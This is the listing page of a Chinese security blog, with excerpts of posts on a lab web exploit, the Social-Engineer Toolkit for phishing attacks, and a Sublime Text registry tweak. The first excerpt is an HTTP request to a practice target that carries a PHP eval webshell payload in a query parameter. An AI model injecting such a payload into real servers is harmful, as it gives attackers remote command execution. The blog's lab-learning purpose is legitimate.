+123456789GET &#x2F;index&#x2F;vuln?param&#x3D;&lt;?php+@eval($_REQUEST[&#39;pass&#39;]);?&gt; HTTP&#x2F;1.1Host: e8fe489880064b818843907d097c34fd.app.mituan.zone:8000User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101 Firefox&#x2F;83.0Acce ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/Social-Engineer-Toolkit%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Social-Engineer-Toolkit的使用">     <img class="post_bg" src="/img/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Social-Engineer-Toolkit的使用"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/Social-Engineer-Toolkit%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Social-Engineer-Toolkit的使用">Social-Engineer-Toolkit的使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.495Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-30T07:24:48.000Z" title="更新于 2020-12-30 15:24:48">2020-12-30</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></span></div><div class="content">一、什么是社会工程学
+社会工程学（Social Engineering）在上世纪60年代左右作为正式的学科出现，广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。你们可能永远都想象不到，对于黑客们来说，通过一个用户名、一串数字、一串英文代码，社会工程师就可以通过这么几条的线索，通过社工攻击手段，加以筛选、整理，就能把你的所有个人情况信息、家庭状况、兴趣爱好、婚姻状况、你在网上留下的一切痕迹等个人信息全部掌握得一清二楚。虽然这个可能是最不起眼，而且还是最麻烦的方法。一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。
+二、Social-Engineering-Toolkit
+Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的paylo ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/sublime%E5%8A%A0%E5%85%A5%E5%8F%B3%E9%94%AE/" title="sublime加入右键">     <img class="post_bg" src="/img/sublime.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sublime加入右键"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/sublime%E5%8A%A0%E5%85%A5%E5%8F%B3%E9%94%AE/" title="sublime加入右键">sublime加入右键</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.495Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-10T07:56:08.000Z" title="更新于 2021-02-10 15:56:08">2021-02-10</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a></span></div><div class="content">1、打开注册表，win+R输入regedit
+2、在HKEY_CLASSSES_ROOT/ * /Shell 下面找到 Open with Sublime Text 没有就在Shell下新建一项
+在Open with Sublime Text这里新建字符串值，命名为Icon，值为”sublime所在路径，0”
+1D:\Program Files\Sublime Text 3\sublime_text.exe,0
+
+
+3、在Open with Sublime Text下面新建项command,默认值为
+1D:\Program Files\Sublime Text 3\sublime_text.exe &quot;%1&quot;
+
+
+不用重启，立马见效
+
+
+
+
+思考由此，应该也可以自己添加自己想要放进右键的软件功能了吧！
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">dummersoul</div><div class="author-info__description">网络安全从业者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dummersoul"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dummersoul" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dummersoul@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到dummersoul的技术小窝</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现"><img src="https://techterms.com/img/sm/cve_1618.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-42550漏洞复现"/></a><div class="content"><a class="title" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现">CVE-2021-42550漏洞复现</a><time datetime="2024-03-10T06:54:43.353Z" title="发表于 2024-03-10 14:54:43">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss"><img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*WwN78iOX-HC74T9AHGxjOg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="webview intent uxss"/></a><div class="content"><a class="title" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss">webview intent uxss</a><time datetime="2024-03-10T06:54:17.108Z" title="发表于 2024-03-10 14:54:17">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析"><img src="https://picx.zhimg.com/70/v2-fd69dc15d82e0d4b54cfba25e7e15443_1440w.avis?source=172ae18b&amp;biz_tag=Post" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于Tomcat的内存马分析"/></a><div class="content"><a class="title" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析">基于Tomcat的内存马分析</a><time datetime="2024-03-10T06:53:39.202Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构"><img src="https://images.ytao.top/tomcat.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat架构"/></a><div class="content"><a class="title" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构">Tomcat架构</a><time datetime="2024-03-10T06:53:39.200Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构"><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20211201164619.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一文搞懂DEX文件结构"/></a><div class="content"><a class="title" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构">一文搞懂DEX文件结构</a><time datetime="2023-11-28T08:48:58.520Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time></div></div></div></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Android/" style="font-size: 1.44em; color: #99a7ba">Android</a> <a href="/tags/CDN%E5%8A%A0%E9%80%9F/" style="font-size: 1.1em; color: #999">CDN加速</a> <a href="/tags/CVE/" style="font-size: 1.1em; color: #999">CVE</a> <a href="/tags/JBoss/" style="font-size: 1.1em; color: #999">JBoss</a> <a href="/tags/android%E5%AE%89%E5%85%A8/" style="font-size: 1.1em; color: #999">android安全</a> <a href="/tags/ctf/" style="font-size: 1.27em; color: #99a0a9">ctf</a> <a href="/tags/cve/" style="font-size: 1.1em; color: #999">cve</a> <a href="/tags/docker/" style="font-size: 1.1em; color: #999">docker</a> <a href="/tags/flag/" style="font-size: 1.1em; color: #999">flag</a> <a href="/tags/getshell/" style="font-size: 1.21em; color: #999ea4">getshell</a> <a href="/tags/git/" style="font-size: 1.16em; color: #999b9e">git</a> <a href="/tags/hexo/" style="font-size: 1.16em; color: #999b9e">hexo</a> <a href="/tags/java/" style="font-size: 1.1em; color: #999">java</a> <a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.21em; color: #999ea4">java安全</a> <a href="/tags/linux/" style="font-size: 1.1em; color: #999">linux</a> <a href="/tags/mitu/" style="font-size: 1.1em; color: #999">mitu</a> <a href="/tags/perl/" style="font-size: 1.1em; color: #999">perl</a> <a href="/tags/redis/" style="font-size: 1.1em; color: #999">redis</a> <a href="/tags/struts2/" style="font-size: 1.1em; color: #999">struts2</a> <a href="/tags/vulnhub/" style="font-size: 1.33em; color: #99a2af">vulnhub</a> <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.1em; color: #999">中间件</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/" style="font-size: 1.39em; color: #99a4b4">内网提权</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.16em; color: #999b9e">内网渗透</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 1.1em; color: #999">内网穿透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.1em; color: #999">反序列化</a> <a href="/tags/%E5%9B%BE%E5%BA%8A/" style="font-size: 1.21em; color: #999ea4">图床</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.33em; color: #99a2af">工具</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 1.16em; color: #999b9e">应急响应</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 1.1em; color: #999">抓包</a> <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" style="font-size: 1.1em; color: #999">权限维持</a> <a href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" style="font-size: 1.1em; color: #999">社会工程学</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.21em; color: #999ea4">逆向</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">逻辑漏洞</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 1.5em; color: #99a9bf">靶机</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">55</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">1</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">60</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2020-10-19T16:00:00.000Z"></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-03-19T15:33:38.406Z"></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 <i id="heartbeat" class="fa fas fa-heartbeat"></i> dummersoul</div><div class="framework-info"><!--span= _p('footer.framework') + ' '--><!--a(href='https://hexo.io')= 'Hexo'--><!--span.footer-separator |--><!--span= _p('footer.theme') + ' '--><!--a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'--></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
+  if (true) { 
+    var typed = new Typed("#subtitle", {
+      strings: "学习永无止境,兴趣决定成就,分享是一种美德，共享是一种智慧".split(","),
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50
+    })
+  } else {
+    document.getElementById("subtitle").innerHTML = '学习永无止境'
+  }
+}
+
+if (true) {
+  if (typeof Typed === 'function') subtitleType()
+  else $.getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js', subtitleType)
+} else {
+  subtitleType()
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/third-party/switch_comments.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script src="//code.tidio.co/cqinyzbakrsti8bz4wjlaffn3gkjplgj.js" async="async"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
